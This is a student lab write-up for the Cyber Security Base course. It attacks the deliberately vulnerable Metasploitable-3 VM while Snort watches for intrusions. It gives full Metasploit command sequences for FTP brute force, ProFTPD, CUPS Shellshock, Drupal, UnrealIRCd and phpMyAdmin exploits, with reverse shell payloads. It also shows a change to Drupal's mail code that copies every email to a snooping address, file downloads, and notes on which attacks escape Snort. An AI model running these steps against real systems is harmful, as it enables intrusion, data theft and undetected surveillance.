# Cyber Security Base: Project II.
We are tasked to do at least five attacks from which three are identified by snort, and two unidentified. We begin by installing metasploitable-3, snort, and use the provided snort config files. Metasploitable-3 is ran via vagrant. We get the IP to the system from the vagrantfile: `172.28.128.3` . [0][1]

We scan ports using `nmap`, and find several open ports:

```sh
nmap 172.28.128.3 -Pn
```
```sh
PORT     STATE   SERVICE
21/tcp   open    ftp
22/tcp   open    ssh
80/tcp   open    http
445/tcp  open    microsoft-ds
631/tcp  open    ipp
3000/tcp closed  ppp
3306/tcp open    mysql
8080/tcp open    http-proxy
8181/tcp closed  intermapper
```
We do a more indepth search
```sh
sudo nmap -n -sS -sV -sC 172.28.128.3 -p0-65535 # scan all ports

PORT     STATE  SERVICE     VERSION
21/tcp   open   ftp         ProFTPD 1.3.5
22/tcp   open   ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 2b:2e:1f:a4:54:26:87:76:12:26:59:58:0d:da:3b:04 (DSA)
|   2048 c9:ac:70:ef:f8:de:8b:a3:a3:44:ab:3d:32:0a:5c:6a (RSA)
|   256 c0:49:cc:18:7b:27:a4:07:0d:2a:0d:bb:42:4c:36:17 (ECDSA)
|_  256 a0:76:f3:76:f8:f0:70:4d:09:ca:e1:10:fd:a9:cc:0a (ED25519)
 
80/tcp   open   http        Apache httpd 2.4.7
| http-ls: Volume /
| SIZE  TIME              FILENAME
| -     2020-10-29 19:37  chat/
| -     2011-07-27 20:17  drupal/
| 1.7K  2020-10-29 19:37  payroll_app.php
| -     2013-04-08 12:06  phpmyadmin/
|
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Index of /
445/tcp  open   netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
631/tcp  open   ipp         CUPS 1.7
| http-methods: 
|_  Potentially risky methods: PUT
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: CUPS/1.7 IPP/2.1
|_http-title: Home - CUPS 1.7.2
 
3000/tcp closed ppp
3306/tcp open   mysql       MySQL (unauthorized)
3500/tcp open   http        WEBrick httpd 1.3.1 (Ruby 2.3.8 (2018-10-18))
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: WEBrick/1.3.1 (Ruby/2.3.8/2018-10-18)
|_http-title: Ruby on Rails: Welcome aboard
6697/tcp open   irc         UnrealIRCd
8080/tcp open   http        Jetty 8.1.7.v20120910
|_http-server-header: Jetty(8.1.7.v20120910)
|_http-title: Error 404 - Not Found
8181/tcp closed intermapper
Service Info: Hosts: 127.0.1.1, UBUNTU, irc.TestIRC.net; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

By scanning the whole port range we also found open ports at 3500 for WEBrick and 6697 for UnrealIRCd. We find unsecure websites at http://172.28.127.3 .
Both namp scans are alerted as suspicious traffic priority 2 in SNORT.


## IDENTIFIED ATTACK 1: Exploit scanner ftplogin
In this exploit we will try to bruteforce a login via common passwords list and an open ftp port.
Our list is users.txt with lines: 'root', 'admin', 'vagrant'. 
```sh
use auxiliary/scanner/ftp/ftp_login/
set RHOSTS 172.28.128.3
set STOP_ON_SUCCESS true
set BLANK_PASSWORDS true
set USERS_AS_PASS true
set USER_FILE users.txt
exploit
```
```sh
[*] 172.28.128.3:21       - 172.28.128.3:21 - Starting FTP login sweep
[-] 172.28.128.3:21       - 172.28.128.3:21 - LOGIN FAILED: root: (Incorrect: )
[-] 172.28.128.3:21       - 172.28.128.3:21 - LOGIN FAILED: root:root (Incorrect: )
[-] 172.28.128.3:21       - 172.28.128.3:21 - LOGIN FAILED: root:admin (Incorrect: )
[-] 172.28.128.3:21       - 172.28.128.3:21 - LOGIN FAILED: root:vagrant (Incorrect: )
[-] 172.28.128.3:21       - 172.28.128.3:21 - LOGIN FAILED: admin: (Incorrect: )
[-] 172.28.128.3:21       - 172.28.128.3:21 - LOGIN FAILED: admin:root (Incorrect: )
[-] 172.28.128.3:21       - 172.28.128.3:21 - LOGIN FAILED: admin:admin (Incorrect: )
[-] 172.28.128.3:21       - 172.28.128.3:21 - LOGIN FAILED: admin:vagrant (Incorrect: )
[-] 172.28.128.3:21       - 172.28.128.3:21 - LOGIN FAILED: vagrant: (Incorrect: )
[-] 172.28.128.3:21       - 172.28.128.3:21 - LOGIN FAILED: vagrant:root (Incorrect: )
[-] 172.28.128.3:21       - 172.28.128.3:21 - LOGIN FAILED: vagrant:admin (Incorrect: )
[+] 172.28.128.3:21       - 172.28.128.3:21 - Login Successful: vagrant:vagrant
[*] 172.28.128.3:21       - Scanned 1 of 1 hosts (100% complete)
```
This is detected by SNORT in the following way:
```
09/12-13:44:31.939358  [**] [1:2002383:12] ET SCAN Potential FTP Brute-Force attempt response [**] [Classification: Unsuccessful User Privilege Gain] [Priority: 1] {TCP} 172.28.128.3:21 -> 172.28.128.1:34683
09/12-13:44:31.939358  [**] [1:491:8] INFO FTP Bad login [**] [Classification: Potentially Bad Traffic] [Priority: 2] {TCP} 172.28.128.3:21 -> 172.28.128.1:34683
09/12-13:44:32.475637  [**] [1:489:7] INFO FTP no password [**] [Classification: Unknown Traffic] [Priority: 3] {TCP} 172.28.128.1:43497 -> 172.28.128.3:21
```
By setting `BRUTEFORCE_SPEED=0` we avoid priority 1 flagging, but still get noticed as priority 2 bad traffic. 

## IDENTIFIED ATTACK 2: Exploit proftpd
Using the ftp version information `ProFTPD 1.3.5` we use the proftpd module to exploit SITE CPFR/CPTO mod_copy commands to copy files. This allows also e.g. to copy PHP payloads, which we will not do. [3]
```
search proftpd
use exploit proftpd_modcopy_exec # this one has v 1.3.5 support
set RHOSTS 172.28.128.3
show payloads
use payload cmd/unix/reverse_netcat
exploit
```
Snort recognizes this generating the alerts:
```
09/12-10:26:28.437681  [**] [1:2011465:6] ET WEB_SERVER /bin/sh In URI Possible Shell Command Execution Attempt [**] [Classification: Web Application Attack] [Priority: 1] {TCP} 172.28.128.1:41777 -> 172.28.128.3:80
09/12-10:29:24.666278  [**] [1:1365:5] WEB-ATTACKS rm command attempt [**] [Classification: Web Application Attack] [Priority: 1] {TCP} 172.28.128.1:39791 -> 172.28.128.3:80
09/12-10:29:24.666278  [**] [1:1360:5] WEB-ATTACKS netcat command attempt [**] [Classification: Web Application Attack] [Priority: 1] {TCP} 172.28.128.1:39791 -> 172.28.128.3:80
```
We change payload to `reverse_perl`. Snort alerts again
```
09/12-10:32:30.087669  [**] [1:1356:5] WEB-ATTACKS perl execution attempt [**] [Classification: Web Application Attack] [Priority: 1] {TCP} 172.28.128.1:43669 -> 172.28.128.3:80
```
We create a file with `touch test.txt`. Snort does not pay attention to this. We remove the file, and exit.

We change payload to `reverse_python`. Snort alerts again.
```
09/12-10:42:48.344549  [**] [1:1350:5] WEB-ATTACKS python access attempt [**] [Classification: Web Application Attack] [Priority: 1] {TCP} 172.28.128.1:45555 -> 172.28.128.3:80
09/12-10:42:48.344549  [**] [1:2101350:9] GPL WEB_SERVER python access attempt [**] [Classification: Web Application Attack] [Priority: 1] {TCP} 172.28.128.1:45555 -> 172.28.128.3:80
09/12-10:42:48.344549  [**] [1:2008176:6] ET WEB_SERVER Possible SQL Injection (exec) [**] [Classification: Attempted Administrator Privilege Gain] [Priority: 1] {TCP} 172.28.128.1:45555 -> 172.28.128.3:80
```
We create file `touch test.py` and fill it with  `echo "print('hello')" > test.py` and run the script with `python test.py` succesfully without snort alerting again.

## IDENTIFIED ATTACK 3: Exploit CUPS

Having found the user login for vagrant. We do some social engineering and encourage the vagrant hoster to give admin rights to the user vagrant with `usermod -a -G lpadmin vagrant`. [3]
 
We find CUPS at https://172.28.128.3:631/ .
We use the Shellshock vulnerability via CUPS through PRINTER_INFO and PRINTER_LOCATION variables. [1]
```
search cups
use exploit/multi/http/cups_bash_env_exec
set HttpPassword vagrant
set HttpUsername vagrant
set RHOSTS 172.28.128.3
set RPORT 631
set payload cmd/unix/reverse_ruby_ssl
set LHOST 192.168.1.106
exploit
```
We manage to connect and add a printer, however the shell sessions is closed abruptly for unknown reasons, perhaps due to nested VM network configurations.
```
[*] Started reverse SSL handler on 192.168.1.106:4444 
[+] Added printer successfully
[+] Deleted printer 'ubDAXsZTeUCYap' successfully
[*] Command shell session 15 opened (192.168.1.106:4444 -> 192.168.1.106:46222) at 2023-09-13 12:28:35 +0300
[*] 172.28.128.3 - Command shell session 15 closed.
```
Other payloads yield no better luck.
SNORT also notices the attack as priority 1: 
```
09/13-09:30:05.183727  [**] [1:1768:7] WEB-IIS header field buffer overflow attempt [**] [Classification: Web Application Attack] [Priority: 1] {TCP} 172.28.128.1:44853 -> 172.28.128.3:631
```
The same alert and other priority 1 alerts are given by SNORT also when accessing the admin page via browser.
`https://172.28.128.3:631/admin/`.
The user vagrant can access the admin site, but logs of attempts and exploits are saved and can be read, e.g. 
```
localhost - vagrant [13/Sep/2023:09:30:05 +0000] "POST /admin/ HTTP/1.1" 200 126 CUPS-Delete-Printer successful-ok
```
## IDENTIFIED ATTACK 4: Exploits drupal
```
use exploit multi/http/drupal_drupageddon
set RHOSTS 172.28.128.3
set payload php/meterpreter/reverse_tcp
```
Snort does not understand the intrusion properly and gives the same alert as when trying to login without password, but since it is a priority 1 alert we count it as identified. We get access.
```
09/12-11:00:50.346247  [**] [1:2012887:2] ET POLICY HTTP POST contains pass= in cleartext [**] [Classification: Potential Corporate Privacy Violation] [Priority: 1] {TCP} 172.28.128.1:38337 -> 172.28.128.3:80
```
We go to /var/www/html/drupal/includes/ and format drupal_mail function in `mail.inc` to always send a secondary email to `my_snooping@my_email.com`, with the header
 `'to' => 'my_snooping@my_email.com'`


## MISSED ATTACK 1: Exploit UnrealIRCd
We see the port 6697 open with UnrealIRCd, and search for an exploit.  We find a backdoor exploit that was maliciously added to the 3.2.8.1 download archive between Nov 2009 - June 2010. [3]
```
search UnrealIRCd
use unix/irc/unreal_ircd_3281_backdoor
set RHOSTS 172.28.128.3
set payload cmd/unix/reverse_perl
set LHOST 192.168.1.106
set RPORT 6697 
exploit
```
We gain access. Snort sees this as misc low priority 3 activity:
```
09/12-12:44:17.739595  [**] [1:2000355:5] ET CHAT IRC authorization message [**] [Classification: Misc activity] [Priority: 3] {TCP} 172.28.128.3:6697 -> 172.28.128.1:34553
```

Trying other payloads such as `php/reverse_php` gives identical SNORT warning message and yields access.

## MISSED ATTACK 2: Exploits phpmyadmin
We see the open ports at 80, with website 172.28.128.3/phpmyadmin. We try to use the PREG_REPLACE_EVAL vulnerability in phpMyAdmin's replace_prefix_tbl via db_settings.php [3]. We use an educated guess for the password for root [2].
```sh
use exploit/multi/http/phpmyadmin_preg_replace
set payload php/meterpreter/reverse_tcp
set RHOSTS 172.28.128.3
set LHOST 192.168.1.106
set PASSWORD sploitme
```
We gain access, and SNORT is not alerted in any way. We get users and download the www/ folder.
```sh
pwd # /var/www/html/phpmyadmin
cd ../..
download log.html
[*] Completed : log.html -> /home/univm/metasploitable3-workspace/log.html
cd /tmp
shell
ls /home > users.txt
exit
download users.txt
shell
rm users.txt
cd /var/
download www/
```

## MISSED ATTACK 3: Exploits chat

http://178.28.128.3/chat/index.php is using unsecured tokens, and the cookie for 
user is simply name:name value:my_username. So by editing the value of the name-cookie, we can impersonate someone else.

# References:

[0] https://cybersecuritybase.mooc.fi <br>
[1] https://github.com/rapid7/metasploitable3 <br>
[2] https://stuffwithaurum.com/2020/04/17/metasploitable-3-linux-an-exploitation-guide/ <br>
[3] https://www.rapid7.com/products/metasploit/
